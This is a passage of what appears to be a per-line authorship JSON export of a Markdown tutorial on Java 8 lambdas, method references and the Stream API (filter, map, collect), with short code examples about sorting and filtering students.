        "lineNumber": 97,
        "author": {
          "gitId": "-"
        },
        "content": "1. a static method of a class (`MyClass::staticMethodName`),"
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "-"
        },
        "content": "1. an instance method of some object (`myObject::methodName`),"
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "-"
        },
        "content": "1. a constructor (`MyClass::new`) or"
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "-"
        },
        "content": "1. an instance method of an object of some type (`MyObjectType::methodName`)"
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": "In all four cases, the return type of the referenced method should match the return type of the required functional interface (unless this is `void`). In the first three cases, the parameters of the two methods would also need to match."
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "-"
        },
        "content": "Suppose the parameter required is `(SomeClass object)`, then the implemented method of the functional interface object created would run `MyClass.staticMethodName(object)`, `myObject.methodName(object)` or `new MyClass(object)`."
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "-"
        },
        "content": "However, for the last case, the parameters required by the two methods would be different. Suppose the parameter required by the abstract method of the functional interface is `(SomeClass object)` and `SomeClass::doSomething` is given as the required functional interface. This would translate to running `object.doSomething()` in the implemented method."
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "-"
        },
        "content": "If the parameters required by the abstract method are `(SomeClass object, SomeArgument arg)`, the implemented method would run `object.doSomething(arg)`. The implemented method runs the referenced method of the first parameter, with the remaining parameters supplied to the referenced method as arguments."
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "-"
        },
        "content": "For more information, you should take a look at [this guide written by Esteban Herrera](https://www.codementor.io/eh3rrera/using-java-8-method-reference-du10866vx), who has more than 12 years of experience in Java. The guide provides clear examples to illustrate the different kinds of method references and how it can be used."
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "-"
        },
        "content": "#### Lambda Expressions"
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "-"
        },
        "content": "Moving on to lambda expressions! Lambda expressions are simply a clear and concise way to instantiate an object that implements a functional interface. The expression itself, however, does not contain information about which functional interface it implements, this is deduced by the compiler through the context where it is used."
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "-"
        },
        "content": "The structure of a lambda expression is as such : `(parameters) -\u003e \u003cbody\u003e`, where the `\u003cbody\u003e` can be a block of statement(s),"
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "-"
        },
        "content": "```java"
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "-"
        },
        "content": "(int x, int y) -\u003e { return x + y; }"
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 120,
        "author": {
          "gitId": "-"
        },
        "content": "or an expression,"
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "-"
        },
        "content": "```java"
      },
      {
        "lineNumber": 122,
        "author": {
          "gitId": "-"
        },
        "content": "(x, y) -\u003e x + y"
      },
      {
        "lineNumber": 123,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "-"
        },
        "content": "If used in the same context, these two lambda expressions are actually equivalent!"
      },
      {
        "lineNumber": 125,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 126,
        "author": {
          "gitId": "-"
        },
        "content": "The parameters types of lambda expressions can be inferred by the compiler and are optional. It is actually recommended that parameters types are omitted when writing lambda expressions so as to keep the code concise."
      },
      {
        "lineNumber": 127,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 128,
        "author": {
          "gitId": "-"
        },
        "content": "When an expression is used for the body, the result of the expression is returned. The expression can also result in nothing (eg. `(String s) -\u003e System.out.println(s)`), which means that the method expressed by the lambda returns `void`."
      },
      {
        "lineNumber": 129,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 130,
        "author": {
          "gitId": "-"
        },
        "content": "When a block is used for the body, the same rules for using or omitting the `return` statement for a normal method applies."
      },
      {
        "lineNumber": 131,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 132,
        "author": {
          "gitId": "-"
        },
        "content": "When the lambda has a single parameter, the parentheses surrounding the parameter can also be removed,"
      },
      {
        "lineNumber": 133,
        "author": {
          "gitId": "-"
        },
        "content": "```java"
      },
      {
        "lineNumber": 134,
        "author": {
          "gitId": "-"
        },
        "content": "x -\u003e x + 10"
      },
      {
        "lineNumber": 135,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 136,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 137,
        "author": {
          "gitId": "-"
        },
        "content": "For a lambda expression to be compatible with the required functional interface, the lambda expression must have __the same parameters types__ and __a compatible return type__ as the required functional interface."
      },
      {
        "lineNumber": 138,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 139,
        "author": {
          "gitId": "-"
        },
        "content": "Although lambda expressions can be expressed in a block, it does not introduce a new level of scoping. Names in the body of the lambda are interpreted in the same way as its enclosing scope, with the addition of the names of its parameters. `this` and `super` can also be used in the lambda body to refer to the enclosing object and the parent class of the enclosing object."
      },
      {
        "lineNumber": 140,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 141,
        "author": {
          "gitId": "-"
        },
        "content": "This also means that lambda expressions are able to access local variables of the enclosing scope as well. However, any local variables accessed by a lambda expression must be final or effectively final (ie. cannot be reassigned another value)."
      },
      {
        "lineNumber": 142,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 143,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "To understand more about lambda expressions, take a look at https://www.lambdafaq.org/ ! The website provides easy-to-understand answers to many questions which you may have on lambda expressions. For a detailed use case of lambda expressions, you can read [this Java tutorial](https://docs.oracle.com/javase/tutorial/java/javaOO/lambdaexpressions.html)."
      },
      {
        "lineNumber": 144,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 145,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 146,
        "author": {
          "gitId": "-"
        },
        "content": "#### An Example"
      },
      {
        "lineNumber": 147,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 148,
        "author": {
          "gitId": "-"
        },
        "content": "Now that we have some understanding on functional interface, method references and lambda expressions, let\u0027s consolidate our understanding with an example."
      },
      {
        "lineNumber": 149,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 150,
        "author": {
          "gitId": "-"
        },
        "content": "`Comparator\u003cT\u003e` may be a familiar interface to you. In previous Java editions, to create an object extending this interface, you could either instantiate the object from a named class or an anonymous class, both of which need to override the abstract methods in `Comparator\u003cT\u003e`. So the code may look something like this:"
      },
      {
        "lineNumber": 151,
        "author": {
          "gitId": "-"
        },
        "content": "```java"
      },
      {
        "lineNumber": 152,
        "author": {
          "gitId": "-"
        },
        "content": "// trying to sort students by height"
      },
      {
        "lineNumber": 153,
        "author": {
          "gitId": "-"
        },
        "content": "students.sort(new Comparator\u003cStudent\u003e() {"
      },
      {
        "lineNumber": 154,
        "author": {
          "gitId": "-"
        },
        "content": "    public int compare(Student s1, Student s2) {"
      },
      {
        "lineNumber": 155,
        "author": {
          "gitId": "-"
        },
        "content": "      return Double.compare(s1.getHeight(), s2.getHeight());"
      },
      {
        "lineNumber": 156,
        "author": {
          "gitId": "-"
        },
        "content": "    }"
      },
      {
        "lineNumber": 157,
        "author": {
          "gitId": "-"
        },
        "content": "  });"
      },
      {
        "lineNumber": 158,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 159,
        "author": {
          "gitId": "-"
        },
        "content": "Let\u0027s face it. Declaring classes (anonymous or not) is quite a pain. Declaring a named class adds to the number of classes you need to maintain while the syntax of a anonymous class is quite an eyesore."
      },
      {
        "lineNumber": 160,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 161,
        "author": {
          "gitId": "-"
        },
        "content": "In Java 8, this interface has become a functional interface (surprise, surprise), so you can write a comparator with a lambda expression."
      },
      {
        "lineNumber": 162,
        "author": {
          "gitId": "-"
        },
        "content": "```java"
      },
      {
        "lineNumber": 163,
        "author": {
          "gitId": "-"
        },
        "content": "// trying to sort students by height"
      },
      {
        "lineNumber": 164,
        "author": {
          "gitId": "-"
        },
        "content": "students.sort((s1, s2) -\u003e Double.compare(s1.getHeight(), s2.getHeight()));"
      },
      {
        "lineNumber": 165,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 166,
        "author": {
          "gitId": "-"
        },
        "content": "The compiler is able to infer that an object of type `Comparator\u003cStudent\u003e` is expected and that the lambda expression fits into the definition for `compare` (the single abstract method), thus creating an instance of type `Comparator\u003cStudent\u003e` with the `Double.compare(s1.getHeight(), s2.getHeight())` returned in the implemented `compare` method."
      },
      {
        "lineNumber": 167,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 168,
        "author": {
          "gitId": "-"
        },
        "content": "By using an lambda expression, the code is much more simplified, and can be now written on a single line. However, the expression in the body is slightly complicated and it may not be easily understood by everyone."
      },
      {
        "lineNumber": 169,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 170,
        "author": {
          "gitId": "-"
        },
        "content": "Suppose this comparison is used over and over again in the code. To improve cohesion in the code, you may want to add instance method `compareToByHeight(Student other)` in the `Student` class."
      },
      {
        "lineNumber": 171,
        "author": {
          "gitId": "-"
        },
        "content": "```java"
      },
      {
        "lineNumber": 172,
        "author": {
          "gitId": "-"
        },
        "content": "public int compareToByHeight(Student other){"
      },
      {
        "lineNumber": 173,
        "author": {
          "gitId": "-"
        },
        "content": "    return Double.compare(height, other.height);"
      },
      {
        "lineNumber": 174,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 175,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 176,
        "author": {
          "gitId": "-"
        },
        "content": "And you can use a method reference as the functional interface instead."
      },
      {
        "lineNumber": 177,
        "author": {
          "gitId": "-"
        },
        "content": "```java"
      },
      {
        "lineNumber": 178,
        "author": {
          "gitId": "-"
        },
        "content": "// trying to sort students by height"
      },
      {
        "lineNumber": 179,
        "author": {
          "gitId": "-"
        },
        "content": "students.sort(Student::compareToByHeight);"
      },
      {
        "lineNumber": 180,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 181,
        "author": {
          "gitId": "-"
        },
        "content": "Notice that the code is very easy to understand at a high level and what the intentions of the author can be understood from the code, reducing the need for further documentation. This also makes code more maintainable."
      },
      {
        "lineNumber": 182,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 183,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### What is a Stream?"
      },
      {
        "lineNumber": 184,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 185,
        "author": {
          "gitId": "-"
        },
        "content": "Now that we have the basics nailed, let\u0027s get started on Streams. Streams are basically sequences of elements. However, when dealing with streams, we are not so interested in where the data of elements is stored, what is currently stored in each element, but rather __what we can do with the elements__."
      },
      {
        "lineNumber": 186,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 187,
        "author": {
          "gitId": "-"
        },
        "content": "To use a stream, we need to first construct one. A stream can be obtained from an existing source of elements, such as a collection or an array. We will get into the details of how to do so in the next section."
      },
      {
        "lineNumber": 188,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 189,
        "author": {
          "gitId": "-"
        },
        "content": "The methods described in the [Stream API](https://docs.oracle.com/javase/8/docs/api/java/util/stream/Stream.html) allows us to perform operations on the elements. The stream operations can be categorised into two kinds: intermediate or terminal. These operations may take in functional interfaces, which will exactly define what is performed on each element."
      },
      {
        "lineNumber": 190,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 191,
        "author": {
          "gitId": "-"
        },
        "content": "Intermediate operations are operations which returns a stream. They can be stateless, operating on each element independently, or stateful, where the result of the operation performed on an element depends on other elements in the stream. The intermediate operations can"
      },
      {
        "lineNumber": 192,
        "author": {
          "gitId": "-"
        },
        "content": "* reduce the number of elements in the returned stream (eg. `filter`),"
      },
      {
        "lineNumber": 193,
        "author": {
          "gitId": "-"
        },
        "content": "* transform the type of the elements in the returned stream (eg. `map`) or"
      },
      {
        "lineNumber": 194,
        "author": {
          "gitId": "-"
        },
        "content": "* change the order of the elements in the returned stream (eg. `sorted`)"
      },
      {
        "lineNumber": 195,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 196,
        "author": {
          "gitId": "-"
        },
        "content": "As a stream is returned from an intermediate operation, you can chain many of these intermediates operations in a single statement. However, intermediate operations are *lazy* and no processing is actually done when an intermediate operation is invoked."
      },
      {
        "lineNumber": 197,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 198,
        "author": {
          "gitId": "-"
        },
        "content": "To get any tangible output and to start the processing the operations on the stream, you will need to add a terminal operation. A terminal operation will consume each element in the stream to produce the desired output. Once a stream object is consumed by a terminal operation, it cannot be reused. You would have to construct a new stream object if you want to perform another terminal operation on the stream."
      },
      {
        "lineNumber": 199,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 200,
        "author": {
          "gitId": "-"
        },
        "content": "By putting these operations together, we get a stream pipeline, which has some source of elements, performs multiple operations on the elements in the stream, then utilises the elements to get the desired output."
      },
      {
        "lineNumber": 201,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 202,
        "author": {
          "gitId": "-"
        },
        "content": "A general guideline is that streams operations should not modify its original data source or be unnecessarily stateful (ie. depending on some variable which may change during the execution of the stream pipeline). Going against this rule can lead to exceptions or unexpected, incorrect behaviour when processing the stream pipeline."
      },
      {
        "lineNumber": 203,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 204,
        "author": {
          "gitId": "-"
        },
        "content": "The terminal operations of Streams may also return an [`Optional` object](https://docs.oracle.com/javase/8/docs/api/java/util/Optional.html), which is just an container for your desired output. In the case where the stream is empty, the terminal operation will produce an empty optional. This allows developers to differentiate between the case of the terminal operation producing a legitimate `null` result and the case where there is no result due to the absence of elements."
      },
      {
        "lineNumber": 205,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 206,
        "author": {
          "gitId": "-"
        },
        "content": "To understand more about Streams, you can read up on the [documentation of the Stream package](https://docs.oracle.com/javase/8/docs/api/java/util/stream/package-summary.html). They provide clear explanations on how streams work and how you should make use of them."
      },
      {
        "lineNumber": 207,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 208,
        "author": {
          "gitId": "-"
        },
        "content": "This [tutorial by Brian Goetz](https://www.ibm.com/developerworks/library/j-java-streams-1-brian-goetz/index.html), a Java Language Architect at Oracle, also provides a good overview of Streams. The whole five-part tutorial does go pretty in-depth, so you may want to take your time to go through it."
      },
      {
        "lineNumber": 209,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 210,
        "author": {
          "gitId": "-"
        },
        "content": "## Building a Stream Pipeline"
      },
      {
        "lineNumber": 211,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 212,
        "author": {
          "gitId": "-"
        },
        "content": "In this section, we will look at the details of implementing a stream pipeline and the common pitfalls when implementing one."
      },
      {
        "lineNumber": 213,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 214,
        "author": {
          "gitId": "-"
        },
        "content": "### Constructing Streams"
      },
      {
        "lineNumber": 215,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 216,
        "author": {
          "gitId": "-"
        },
        "content": " One way to construct a stream is simply supplying a sequence of elements to the `Stream.of` method."
      },
      {
        "lineNumber": 217,
        "author": {
          "gitId": "-"
        },
        "content": " ```java"
      },
      {
        "lineNumber": 218,
        "author": {
          "gitId": "-"
        },
        "content": "  // construct stream with Stream.of"
      },
      {
        "lineNumber": 219,
        "author": {
          "gitId": "-"
        },
        "content": "Stream\u003cString\u003e nameStream \u003d Stream.of(\"Alice\", \"Bob\", \"Eve\", \"Mallory\");"
      },
      {
        "lineNumber": 220,
        "author": {
          "gitId": "-"
        },
        "content": " ```"
      },
      {
        "lineNumber": 221,
        "author": {
          "gitId": "-"
        },
        "content": " When you want to use an array as the data source of the stream, you can use `Stream.of` or `Arrays.stream`. `Arrays.stream` is also able to take a primitive-typed array and return a stream of a specialised Stream class that has primitive elements, instead of boxed elements. (You can read more about these specialised streams IntStream, LongStream, DoubleStream in the [Java Documentation](https://docs.oracle.com/javase/8/docs/api/java/util/stream/package-summary.html))"
      },
      {
        "lineNumber": 222,
        "author": {
          "gitId": "-"
        },
        "content": " ```java"
      },
      {
        "lineNumber": 223,
        "author": {
          "gitId": "-"
        },
        "content": " String[] array \u003d {\"Alice\", \"Bob\", \"Eve\", \"Mallory\"};"
      },
      {
        "lineNumber": 224,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 225,
        "author": {
          "gitId": "-"
        },
        "content": " // construct stream from array with Stream.of"
      },
      {
        "lineNumber": 226,
        "author": {
          "gitId": "-"
        },
        "content": " Stream\u003cString\u003e nameStream \u003d Stream.of(array);"
      },
      {
        "lineNumber": 227,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 228,
        "author": {
          "gitId": "-"
        },
        "content": "  // construct stream from array with Arrays.stream"
      },
      {
        "lineNumber": 229,
        "author": {
          "gitId": "-"
        },
        "content": " Stream\u003cString\u003e anotherNameStream \u003d Arrays.stream(array);"
      },
      {
        "lineNumber": 230,
        "author": {
          "gitId": "-"
        },
        "content": " ```"
      },
      {
        "lineNumber": 231,
        "author": {
          "gitId": "-"
        },
        "content": "If you want to use a existing collection, you can simply call `stream` method of the collection."
      },
      {
        "lineNumber": 232,
        "author": {
          "gitId": "-"
        },
        "content": "```java"
      },
      {
        "lineNumber": 233,
        "author": {
          "gitId": "-"
        },
        "content": "Collection\u003cString\u003e names  \u003d new ArrayList();"
      },
      {
        "lineNumber": 234,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 235,
        "author": {
          "gitId": "-"
        },
        "content": "// filling up the collection"
      },
      {
        "lineNumber": 236,
        "author": {
          "gitId": "-"
        },
        "content": "names.add(\"Alice\");"
      },
      {
        "lineNumber": 237,
        "author": {
          "gitId": "-"
        },
        "content": "names.add(\"Bob\");"
      },
      {
        "lineNumber": 238,
        "author": {
          "gitId": "-"
        },
        "content": "names.add(\"Eve\");"
      },
      {
        "lineNumber": 239,
        "author": {
          "gitId": "-"
        },
        "content": "names.add(\"Mallory\");"
      },
      {
        "lineNumber": 240,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 241,
        "author": {
          "gitId": "-"
        },
        "content": "// construct stream from collection"
      },
      {
        "lineNumber": 242,
        "author": {
          "gitId": "-"
        },
        "content": "Stream\u003cString\u003e nameStream \u003d names.stream();"
      },
      {
        "lineNumber": 243,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 244,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 245,
        "author": {
          "gitId": "-"
        },
        "content": "There are many other ways of constructing a stream, such as using the `Stream.iterate` method or `BufferedReader.lines()`. A nice summary of these different ways are provided in the [tutorial by Brian Goetz](https://www.ibm.com/developerworks/library/j-java-streams-1-brian-goetz/index.html)"
      },
      {
        "lineNumber": 246,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 247,
        "author": {
          "gitId": "-"
        },
        "content": "### Intermediate Operations"
      },
      {
        "lineNumber": 248,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 249,
        "author": {
          "gitId": "-"
        },
        "content": "There are many intermediate operations one can apply to their streams, but this guide will just focus on two of the most commonly used intermediate operations, `filter` and `map`."
      },
      {
        "lineNumber": 250,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 251,
        "author": {
          "gitId": "-"
        },
        "content": "#### Filter"
      },
      {
        "lineNumber": 252,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 253,
        "author": {
          "gitId": "-"
        },
        "content": "The `filter` method takes in one parameter, a [`Predicate\u003cT\u003e`](https://docs.oracle.com/javase/8/docs/api/java/util/function/Predicate.html) object, where `T` is the type of the elements in the stream. The functional method of this interface is `test`, which takes in a parameter of type `T` and returns a `boolean` value. Only elements which returns `true` when tested with the  `Predicate\u003cT\u003e` parameter are kept in the returned stream. The elements which returns `false` are filtered out."
      },
      {
        "lineNumber": 254,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 255,
        "author": {
          "gitId": "-"
        },
        "content": "As mentioned in [Functional Interface and Lambda Expressions](#functional-interface-and-lambda-expressions), you can provide the `Predicate\u003cT\u003e` object using lambda expressions or method references."
      },
      {
        "lineNumber": 256,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 257,
        "author": {
          "gitId": "-"
        },
        "content": "Suppose you want a stream of male students. You can filter the male students from a stream of all students by using an lambda that operates on objects of type `T` and returns a `boolean` value"
      },
      {
        "lineNumber": 258,
        "author": {
          "gitId": "-"
        },
        "content": "```java"
      },
      {
        "lineNumber": 259,
        "author": {
          "gitId": "-"
        },
        "content": "Stream\u003cStudent\u003e maleStudents \u003d students.stream()"
      },
      {
        "lineNumber": 260,
        "author": {
          "gitId": "-"
        },
        "content": "                                       .filter(x -\u003e x.isMale());"
      },
      {
        "lineNumber": 261,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 262,
        "author": {
          "gitId": "-"
        },
        "content": "or by using a method reference."
      },
      {
        "lineNumber": 263,
        "author": {
          "gitId": "-"
        },
        "content": "```java"
      },
      {
        "lineNumber": 264,
        "author": {
          "gitId": "-"
        },
        "content": "Stream\u003cStudent\u003e maleStudents \u003d students.stream()"
      },
      {
        "lineNumber": 265,
        "author": {
          "gitId": "-"
        },
        "content": "                                       .filter(Student::isMale);"
      },
      {
        "lineNumber": 266,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 267,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 268,
        "author": {
          "gitId": "-"
        },
        "content": "#### Map"
      },
      {
        "lineNumber": 269,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 270,
        "author": {
          "gitId": "-"
        },
        "content": "The `map` method takes in a [`Function\u003cT, R\u003e`](https://docs.oracle.com/javase/8/docs/api/java/util/function/Function.html) parameter. The functional method `apply` takes in a type `T` object and returns a type `R` object, where `R` is the desired return type. These `T` and `R` are usually inferred by the compiler and you do not have to specify them in your lambda or method reference."
      },
      {
        "lineNumber": 271,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 272,
        "author": {
          "gitId": "-"
        },
        "content": "The `map` method performs the `apply` of the `Function\u003cT, R\u003e` object you provide on the elements and the returned objects from the `apply` operations are put into the returned stream. Each `T` element is mapped to its corresponding `R` object according to the provided `Function\u003cT, R\u003e` object and a `Stream\u003cR\u003e` object is returned."
      },
      {
        "lineNumber": 273,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 274,
        "author": {
          "gitId": "-"
        },
        "content": "Suppose you want a stream of names of all students. Similarly, you can use a lambda expression"
      },
      {
        "lineNumber": 275,
        "author": {
          "gitId": "-"
        },
        "content": "```java"
      },
      {
        "lineNumber": 276,
        "author": {
          "gitId": "-"
        },
        "content": "Stream\u003cString\u003e names \u003d students.stream() // Stream\u003cStudent\u003e here"
      },
      {
        "lineNumber": 277,
        "author": {
          "gitId": "-"
        },
        "content": "                               .map(x -\u003e x.getName()); // Stream\u003cString\u003e here"
      },
      {
        "lineNumber": 278,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 279,
        "author": {
          "gitId": "-"
        },
        "content": "or a method reference."
      },
      {
        "lineNumber": 280,
        "author": {
          "gitId": "-"
        },
        "content": "```java"
      },
      {
        "lineNumber": 281,
        "author": {
          "gitId": "-"
        },
        "content": "Stream\u003cString\u003e names \u003d students.stream() // Stream\u003cStudent\u003e here"
      },
      {
        "lineNumber": 282,
        "author": {
          "gitId": "-"
        },
        "content": "                               .map(Student::getName); // Stream\u003cString\u003e here"
      },
      {
        "lineNumber": 283,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 284,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 285,
        "author": {
          "gitId": "-"
        },
        "content": "### Terminal Operations"
      },
      {
        "lineNumber": 286,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 287,
        "author": {
          "gitId": "-"
        },
        "content": "Two commonly used terminal operations are `reduce` and `collect`. `reduce` typically takes in a [`BinaryOperator\u003cT\u003e`](https://docs.oracle.com/javase/8/docs/api/java/util/function/BinaryOperator.html), which is used to operate on all elements in the stream, resulting in a single final result. To find out how `reduce` works and how you can use it, you can look at [second part of Brian Goetz\u0027s tutorial](https://www.ibm.com/developerworks/library/j-java-streams-2-brian-goetz/index.html)."
      },
      {
        "lineNumber": 288,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 289,
        "author": {
          "gitId": "-"
        },
        "content": "In this guide, we will look more closely at `collect`."
      },
      {
        "lineNumber": 290,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 291,
        "author": {
          "gitId": "-"
        },
        "content": "#### Collect"
      },
      {
        "lineNumber": 292,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 293,
        "author": {
          "gitId": "-"
        },
        "content": "`collect` can be used to transfer the elements in a stream into a collection-like data structure easily. There are two ways of using `collect`:"
      },
      {
        "lineNumber": 294,
        "author": {
          "gitId": "-"
        },
        "content": "* by using `collect(Supplier\u003cR\u003e supplier, BiConsumer\u003cR,? super T\u003e accumulator, BiConsumer\u003cR,R\u003e combiner)`  "
      },
      {
        "lineNumber": 295,
        "author": {
          "gitId": "-"
        },
        "content": "The `supplier` is a factory function that produces empty results of type `R`. The `accumulator` is then applied on the a empty or partial result with the elements, resulting in one or more results. The `combiner` then combines the possibly multiple results into one single result object, which is returned by the terminal operation."
      },
      {
        "lineNumber": 296,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 297,
        "author": {
          "gitId": "-"
        },
        "content": "* by using `collect(Collector\u003c? super T,A,R\u003e collector)`  "
      },
      {
        "lineNumber": 298,
        "author": {
          "gitId": "-"
        },
        "content": "The [`Collector\u003cT,A,R\u003e`](https://docs.oracle.com/javase/8/docs/api/java/util/stream/Collector.html) is specified by a `supplier`, `accumulator`, `combiner` and an optional `finisher`, which can transform the final result from accumulation and combining to a possibly different desired type."
      },
      {
        "lineNumber": 299,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 300,
        "author": {
          "gitId": "-"
        },
        "content": "One can easily do a `collect` operation by making use of the [`Collectors`](https://docs.oracle.com/javase/8/docs/api/java/util/stream/Collectors.html) class, which contains many methods which help to generate a `Collector\u003cT, A, R\u003e`."
      },
      {
        "lineNumber": 301,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 302,
        "author": {
          "gitId": "-"
        },
        "content": "Suppose you want a list of names of all students. You can use the `Collectors.toList()` as the collector."
      },
      {
        "lineNumber": 303,
        "author": {
          "gitId": "-"
        },
        "content": "```java"
      },
      {
        "lineNumber": 304,
        "author": {
          "gitId": "-"
        },
        "content": "List\u003cString\u003e names \u003d students.stream()"
      },
      {
        "lineNumber": 305,
        "author": {
          "gitId": "-"
        },
        "content": "                             .map(Student::getName)"
      },
      {
        "lineNumber": 306,
        "author": {
          "gitId": "-"
        },
        "content": "                             .collect(Collectors.toList());"
      },
      {
        "lineNumber": 307,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 308,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 309,
        "author": {
          "gitId": "-"
        },
        "content": "Suppose you want the average CAP score of all students. You can use  \t`Collectors.averagingDouble(ToDoubleFunction\u003c? super T\u003e mapper)` and provide the mapper to transform the current student elements into their CAP scores."
      },
      {
        "lineNumber": 310,
        "author": {
          "gitId": "-"
        },
        "content": "```java"
      },
      {
        "lineNumber": 311,
        "author": {
